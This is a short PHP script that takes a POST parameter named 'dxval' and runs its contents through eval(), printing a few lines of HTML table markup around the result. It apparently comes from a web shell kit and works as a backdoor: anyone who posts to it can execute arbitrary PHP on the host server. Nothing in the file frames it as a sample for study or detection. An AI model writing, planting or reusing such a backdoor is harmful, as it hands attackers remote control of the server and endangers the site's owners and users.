<?php
if (isset($_POST['dxval']))
{
	print str_repeat("\n", 10).'<!--php_eval-->'."\n\n".'<table border=0 width=100%><tr><td class=listing>'."\n\n";
	eval($_POST['dxval']);
	echo "end";
}
?>